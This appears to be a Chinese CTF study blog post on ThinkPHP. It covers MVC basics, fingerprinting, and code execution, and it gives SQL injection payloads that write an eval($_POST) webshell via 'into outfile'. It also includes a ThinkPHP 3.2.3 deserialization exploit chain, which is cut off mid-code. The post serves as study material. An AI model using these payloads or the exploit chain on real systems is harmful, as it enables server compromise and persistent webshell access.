<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="Hexo Theme Keep">
    <meta name="author" content="Charmersix">
    
    <title>
        
            Web_8_thinkphp专题 |
        
        Charmersix&#39;s Blog
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    <link rel="shortcut icon" href="/images/logo.png">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/regular.min.css">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/solid.min.css">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/brands.min.css">
    <script id="hexo-configurations">
    let KEEP = window.KEEP || {}
    KEEP.hexo_config = {"hostname":"charmersix.icu","root":"/","language":"en","path":"search.json"}
    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066cc","logo":"/images/logo.png","favicon":"/images/logo.png","avatar":"/images/head.jpg","font_size":null,"font_family":null,"hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving.","font_color":null,"hitokoto":true},"scroll":{"progress_bar":false,"percent":true}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"side_tools":{},"pjax":{"enable":false},"lazyload":{"enable":true},"comment":{"enable":true,"use":"waline","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.8"},"waline":{"server_url":"https://waline-charmersix.vercel.app/","reaction":true,"version":2}},"post":{"author_label":{"enable":false,"auto":false,"custom_label_list":["CTFer"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"left","copyright_info":false},"version":"3.6.1"}
    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
    KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original article title","author":"Original article author","link":"Original article link"}
  </script>
<meta name="generator" content="Hexo 5.4.2"></head>


<body>
<div class="progress-bar-container">
    

    
</div>


<main class="page-container">

    

    <div class="page-main-content">

        <div class="page-main-content-top">
            
<header class="header-wrapper">

    <div class="header-content">
        <div class="left">
            
                <a class="logo-image" href="/">
                    <img src="/images/logo.png">
                </a>
            
            <a class="logo-title" href="/">
               Charmersix&#39;s Blog
            </a>
        </div>

        <div class="right">
            <div class="pc">
                <ul class="menu-list">
                    
                        <li class="menu-item">
                            <a class=""
                               href="/"
                            >
                                HOME
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/archives"
                            >
                                ARCHIVES
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/tags"
                            >
                                TAGS
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/links"
                            >
                                LINKS
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/about"
                            >
                                ABOUT
                            </a>
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="fas fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/">HOME</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives">ARCHIVES</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/tags">TAGS</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/links">LINKS</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/about">ABOUT</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle">

            <div class="main-content">

                
                    <div class="fade-in-down-animation">
    <div class="post-page-container">
        <div class="article-content-container">

            <div class="article-title">
                <span class="title-hover-animation">Web_8_thinkphp专题</span>
            </div>

            
                <div class="article-header">
                    <div class="avatar">
                        <img src="/images/head.jpg">
                    </div>
                    <div class="info">
                        <div class="author">
                            <span class="name">Charmersix</span>
                            
                        </div>
                        <div class="meta-info">
                            
<div class="article-meta-info">
    <span class="article-date article-meta-item">
        
            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
        
        <span class="pc">2023-02-19 00:00:00</span>
        <span class="mobile">2023-02-19 00:00</span>
    </span>
    
        <span class="article-update-date article-meta-item">
        <i class="fas fa-file-pen"></i>&nbsp;
        <span class="pc">2023-04-09 16:40:48</span>
    </span>
    
    
    
        <span class="article-tags article-meta-item">
            <i class="fas fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/Web/">Web</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/Study/">Study</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/SQL/">SQL</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/unserialize/">unserialize</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/thinkphp/">thinkphp</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fas fa-file-word"></i>&nbsp;<span>3.2k Words</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fas fa-clock"></i>&nbsp;<span>15 Mins</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                        </div>
                    </div>
                </div>
            

            <div class="article-content keep-markdown-body">
                

                <h2 id="第一节-认识thinkphp"><a href="#第一节-认识thinkphp" class="headerlink" title="第一节 认识thinkphp"></a>第一节 认识thinkphp</h2><h3 id="0x1-php开发框架"><a href="#0x1-php开发框架" class="headerlink" title="0x1 php开发框架"></a>0x1 php开发框架</h3><p>为了避免重复造轮子, 这里就出现了PHP开发框架, 只需要装修一下就可以使用</p>
<p>其背后思想为mvc思想</p>
<h4 id="常见的开发框架"><a href="#常见的开发框架" class="headerlink" title="常见的开发框架"></a>常见的开发框架</h4><h5 id="thinkphp"><a href="#thinkphp" class="headerlink" title="thinkphp"></a>thinkphp</h5><p>开源的PHP框架，为了简化企业级应用开发和敏捷web应用开发而诞生的。遵循apache2开源协议发布。</p>
<h5 id="Yii"><a href="#Yii" class="headerlink" title="Yii"></a>Yii</h5><p>简洁优秀的开源PHP框架</p>
<h5 id="Laravel"><a href="#Laravel" class="headerlink" title="Laravel"></a>Laravel</h5><p>帮你构建一个完美的网络app，每行代码都可以简洁、富于表达力。</p>
<h4 id="MVC基础"><a href="#MVC基础" class="headerlink" title="MVC基础"></a>MVC基础</h4><p>指MVC模式的某种框架，强制性地使应用程序的输入、处理和输出分开。使用MVC应用程序被分成三个核心模型：模型、视图、控制器</p>
<h5 id="view-视图"><a href="#view-视图" class="headerlink" title="view(视图)"></a>view(视图)</h5><p>视图是用户看到的并与之交互的界面, 对老式的web应用程序来说, 视图就是由HTML元素组成的界面</p>
<p>显示数据由视图负责</p>
<h5 id="model-模型"><a href="#model-模型" class="headerlink" title="model(模型)"></a>model(模型)</h5><p>表示业务规则, 在MVC三个部件中, 模型拥有最多的处理任务. 被模型返回的数据是中立的, 模型与数据格式无关, 这样一个模型能为多个视图提供数据, 由于应用于模型的代码只需写一次就可以被多个视图使用, 所以减少了代码的重复性</p>
<p>数据读取与存储是由模型负责的</p>
<h5 id="controller-控制器"><a href="#controller-控制器" class="headerlink" title="controller(控制器)"></a>controller(控制器)</h5><p>是指接收用户输入并调用模型和视图去完成用户的需求, 控制器本身不输出任何东西和做任何处理, 它只是接收请求并决定调用哪个模型构件去处理请求, 然后再确定用哪个视图来显示返回的数据</p>
<h4 id="自己写一个PHP框架"><a href="#自己写一个PHP框架" class="headerlink" title="自己写一个PHP框架"></a>自己写一个PHP框架</h4><p>首先确定一下框架的主要功能</p>
<ul>
<li>基于pathinfo下的路由监听</li>
<li>业务分层, 实现简单的mvc</li>
<li>渲染引擎</li>
<li>控制器</li>
<li>数据处理</li>
</ul>
<p>首先写一个<code>index.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;i am admin controller&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">admin</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$username</span>==<span class="string">&#x27;admin&#x27;</span>&amp;&amp;<span class="variable">$password</span>==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;登陆成功&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;登录失败&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">logout</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;i am logout function&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getInstance</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title function_ invoke__">admin</span>();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>然后新建一个<code>controller目录</code><img  
                     lazyload
                     alt="image"
                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302092014896.png"
                      alt="image-20230209201407853"
                ></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//admin.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;i am admin controller&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">admin</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$username</span>==<span class="string">&#x27;admin&#x27;</span>&amp;&amp;<span class="variable">$password</span>==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;登陆成功&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;登录失败&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">logout</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;i am logout function&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getInstance</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title function_ invoke__">admin</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//user.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;i am user controller&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>最终效果:</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302092014745.png"
                      alt="image-20230209201458710"
                ></p>
<h2 id="第二节-thinkphp漏洞"><a href="#第二节-thinkphp漏洞" class="headerlink" title="第二节 thinkphp漏洞"></a>第二节 thinkphp漏洞</h2><h3 id="0x1-thinkphp框架下的信息收集"><a href="#0x1-thinkphp框架下的信息收集" class="headerlink" title="0x1 thinkphp框架下的信息收集"></a>0x1 thinkphp框架下的信息收集</h3><p> 这里我们<a class="link"   target="_blank" rel="noopener" href="https://www.thinkphp.cn/download/610.html" >下载<i class="fas fa-external-link-alt"></i></a>一个thinkphp的3.2.3版本的源码</p>
<h4 id="寻找tp框架的特征"><a href="#寻找tp框架的特征" class="headerlink" title="寻找tp框架的特征"></a>寻找tp框架的特征</h4><h5 id="url中寻找特征"><a href="#url中寻找特征" class="headerlink" title="url中寻找特征"></a>url中寻找特征</h5><p>thinkphp框架下的url一般是<code>index.php/home/index/index</code>类型, 个别会省略掉<code>index.php</code>, 直接是<code>/home/index/index</code>,这时候我们看到的是三层<code>pathinfo</code>结构, 就要考虑是thinkphp框架<img  
                     lazyload
                     alt="image"
                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302151943439.png"
                      alt="image-20230215194355394"
                ></p>
<p>这时候我们可以修改模块或者控制器的名字, 检查报错信息, 访问<a class="link"   target="_blank" rel="noopener" href="http://localhost/index.php/home/charmersix/index" >http://localhost/index.php/home/charmersix/index<i class="fas fa-external-link-alt"></i></a></p>
<p>可以看到报错信息的话就可以精确找到thinkphp的版本号了<img  
                     lazyload
                     alt="image"
                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302151945716.png"
                      alt="image-20230215194525656"
                ></p>
<h5 id="报错关闭的情况"><a href="#报错关闭的情况" class="headerlink" title="报错关闭的情况"></a>报错关闭的情况</h5><p>通过对thinkphp ui的敏感就可以一眼顶针, 看出其框架</p>
<h5 id="使用软路由检测"><a href="#使用软路由检测" class="headerlink" title="使用软路由检测"></a>使用软路由检测</h5><p>这里我们可以通过get方式提交pathinfo的值, 这里依旧可以通过修改控制器/方法名来看报错信息<img  
                     lazyload
                     alt="image"
                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302152321499.png"
                      alt="image-20230215232102417"
                ></p>
<h4 id="tp的代码执行"><a href="#tp的代码执行" class="headerlink" title="tp的代码执行"></a>tp的代码执行</h4><h5 id="show参数可控下的代码执行"><a href="#show参数可控下的代码执行" class="headerlink" title="show参数可控下的代码执行"></a>show参数可控下的代码执行</h5><p>假设我们有这样的代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Home</span>\<span class="title class_">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"><span class="variable">$n</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">show</span>(<span class="string">&#x27;$n&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以直接渲染我们提交的n参数<img  
                     lazyload
                     alt="image"
                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302152325069.png"
                      alt="image-20230215232518010"
                ></p>
<p>这里我们直接写php代码利用就可以<img  
                     lazyload
                     alt="image"
                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302152328427.png"
                      alt="image-20230215232805355"
                ></p>
<h5 id="利用日志文件代码执行"><a href="#利用日志文件代码执行" class="headerlink" title="利用日志文件代码执行"></a>利用日志文件代码执行</h5><p>在thinkphp开启debug的情况下会在runtime目录下生成log文件, 文件的名称是以<code>年_月_日.log</code>来命名的, 所以我们可以爆破文件名</p>
<p><code>url/Application/Runtime/Logs/Home/y_m_d.log</code></p>
<p>这时候我们就可以抓包通过bp去爆破隐藏信息<img  
                     lazyload
                     alt="image"
                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302161535607.png"
                      alt="image-20230216153509526"
                ></p>
<p>我们就可以得到这样一条接口<img  
                     lazyload
                     alt="image"
                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302161540687.png"
                      alt="image-20230216154048607"
                ></p>
<p>执行代码获得flag即可<img  
                     lazyload
                     alt="image"
                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302161543923.png"
                      alt="image-20230216154300857"
                ></p>
<h4 id="tp的SQL注入漏洞"><a href="#tp的SQL注入漏洞" class="headerlink" title="tp的SQL注入漏洞"></a>tp的SQL注入漏洞</h4><p>在一切开始之前, 我们先看一下我们当前版本thinkphp的官方文档, 在<a class="link"   target="_blank" rel="noopener" href="https://www.kancloud.cn/manual/thinkphp/1728" >这里<i class="fas fa-external-link-alt"></i></a></p>
<h5 id="基于where的SQL注入漏洞"><a href="#基于where的SQL注入漏洞" class="headerlink" title="基于where的SQL注入漏洞"></a>基于where的SQL注入漏洞</h5><p>thinkphpSQL注入利用姿势: where数组绕过<code>?id[where]=id=1&#39;</code></p>
<p>例如:<code>?id[where]=id=1 union select 1, (select group_concat(table_name) from information_schema.tables where table_schema=database()), 3, 4 limit 1, 1%23</code><img  
                     lazyload
                     alt="image"
                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302201358357.png"
                      alt="image-20230220135821253"
                ></p>
<h5 id="注释引起的SQL注入漏洞"><a href="#注释引起的SQL注入漏洞" class="headerlink" title="注释引起的SQL注入漏洞"></a>注释引起的SQL注入漏洞</h5><p>代码如下:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Home</span>\<span class="title class_">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"><span class="variable">$id</span>=<span class="number">1</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="title function_ invoke__">M</span>(<span class="string">&#x27;users&#x27;</span>)-&gt;<span class="title function_ invoke__">comment</span>(<span class="variable">$id</span>)-&gt;<span class="title function_ invoke__">find</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$id</span>));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">show</span>(<span class="string">&#x27;&lt;p&gt;hello &#x27;</span>.<span class="variable">$user</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/p&gt;&#x27;</span>,<span class="string">&#x27;utf-8&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这个框架中, comment将会被<code>/**/</code>包裹注释掉, 但是, 我们可以输入<code>*/</code>将注释闭合从而达到SQL注入, 但是这里我们会发现union联合注入是不能用的, 因为在limit后, union是不好用的<img  
                     lazyload
                     alt="image"
                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302201454501.png"
                      alt="image-20230220145454436"
                ></p>
<p>这里我们就需要用到一个新姿势: 通过数据库写一句话文件, 然后达到我们想要的效果, 但是前提是数据库必须打开了<code>secure-file-priv</code>的写入文件权限<img  
                     lazyload
                     alt="image"
                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302201500078.png"
                      alt="image-20230220150018033"
                ></p>
<p>然后我们直接写入一句话木马</p>
<p>例如: <code>?id=1 */ into outfile &quot;/var/www/html/1.php&quot; lines terminated by &quot;&lt;?php eval($_POST[1])?&gt;&quot;;%23</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302201958102.png"
                      alt="image-20230220195811130"
                ></p>
<p>木马已经写进去, 直接利用即可</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302202000368.png"
                      alt="image-20230220200006298"
                ></p>
<h2 id="第三节-thinkphp反序列化"><a href="#第三节-thinkphp反序列化" class="headerlink" title="第三节 thinkphp反序列化"></a>第三节 thinkphp反序列化</h2><h4 id="thinkphp挖链子"><a href="#thinkphp挖链子" class="headerlink" title="thinkphp挖链子"></a>thinkphp挖链子</h4><p>基本流程</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.寻找可利用的魔术方法, 比较常见的有__destruct/__wakeup</span><br><span class="line"><span class="number">2</span>.继续寻找跳板</span><br><span class="line"><span class="number">3</span>.最终通过其他函数/其他类的属性构造一个函数名可控函数参数可控的链子</span><br><span class="line"><span class="number">4</span>.实现rce</span><br></pre></td></tr></table></figure>

<h3 id="tp3-2版本"><a href="#tp3-2版本" class="headerlink" title="tp3.2版本"></a>tp3.2版本</h3><h4 id="tp3-2-3版本下的反序列化漏洞"><a href="#tp3-2-3版本下的反序列化漏洞" class="headerlink" title="tp3.2.3版本下的反序列化漏洞"></a>tp3.2.3版本下的反序列化漏洞</h4><p>通过反序列化一个数据库的连接开启一个堆叠, 执行SQL语句, 写入一句话木马</p>
<p>这里我们只需要用这个exp就可以生成一串cookie</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>\<span class="title class_">Image</span>\<span class="title class_">Driver</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Think</span>\<span class="title class_">Session</span>\<span class="title class_">Driver</span>\<span class="title class_">Memcache</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Imagick</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$img</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;img=<span class="keyword">new</span> <span class="title class_">Memcache</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>\<span class="title class_">Session</span>\<span class="title class_">Driver</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Think</span>\<span class="title class_">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcache</span> </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$handle</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handle=<span class="keyword">new</span> <span class="title class_">Model</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Think</span>\<span class="title class_">Db</span>\<span class="title class_">Driver</span>\<span class="title class_">Mysql</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Model</span> </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$db</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$pk</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;db=<span class="keyword">new</span> <span class="title class_">Mysql</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;pk=<span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;data[<span class="variable language_">$this</span>-&gt;pk] = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;table&quot;</span> =&gt; <span class="string">&#x27;mysql.user;select &quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &quot;/var/www/html/1.php&quot;# &#x27;</span>,</span><br><span class="line">                <span class="string">&quot;where&quot;</span> =&gt; <span class="string">&quot;1&quot;</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>\<span class="title class_">Db</span>\<span class="title class_">Driver</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">PDO</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Mysql</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span> = <span class="keyword">array</span>(</span><br><span class="line">            PDO::<span class="variable constant_">MYSQL_ATTR_LOCAL_INFILE</span> =&gt; <span class="literal">true</span>,    <span class="comment">// 开启才能读取文件</span></span><br><span class="line">            PDO::<span class="variable constant_">MYSQL_ATTR_MULTI_STATEMENTS</span> =&gt; <span class="literal">true</span> <span class="comment">//开启堆叠,发现不加这句话也可以</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$config</span>     = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&quot;debug&quot;</span>             =&gt;   <span class="number">1</span>,</span><br><span class="line">        <span class="string">&#x27;hostname&#x27;</span>          =&gt;  <span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="comment">// 服务器地址</span></span><br><span class="line">        <span class="string">&#x27;database&#x27;</span>          =&gt;  